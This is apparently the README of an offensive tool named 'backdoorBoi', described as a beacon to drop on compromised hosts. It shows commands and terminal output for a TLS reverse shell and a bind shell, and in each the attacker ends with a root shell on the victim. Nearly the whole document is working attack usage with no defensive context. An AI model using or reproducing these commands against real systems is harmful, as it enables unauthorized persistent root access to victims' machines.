# backdoorBoi
All in one beacon to drop on a compromised host

## Build:

* Please look at github actions or just use the dockerfile to build for your platform.

## Reverse Shell:

* Victim:

```
root@f44b79805a1e:~/cmd# ./backdoorBoiLinux Netcat --address 172.17.0.2 --reverse --port 8000 --tls
2024/06/13 22:45:18 [*] Rev shell spawning, connecting to 172.17.0.2:8000
2024/06/13 22:45:18 Linux

```

* Attacker:

```
root@fcbc11f4beba:~/cmd# ./backdoorBoiLinux Netcat --listen --port 8000 --tls 
2024/06/13 22:45:06 Listener opened on :8000
2024/06/13 22:45:09 Received connection from 172.17.0.3:57398!
whoami
root

```

## Bind Shell:

* Victim:

```
root@fcbc11f4beba:~/cmd# ./backdoorBoiLinux Netcat --bind --port 8000 --tls
2024/06/13 22:45:57 [*] Binding shell spawning for remote code execution
2024/06/13 22:46:02 Received connection from 172.17.0.3:49050!

```

* Attacker:

```
root@f44b79805a1e:~/cmd# ./backdoorBoiLinux Netcat --address 172.17.0.2 --caller --port 8000 --tls
2024/06/13 22:46:02 [*] Bind shell spawning, connecting to 172.17.0.2:8000
whoami
root

```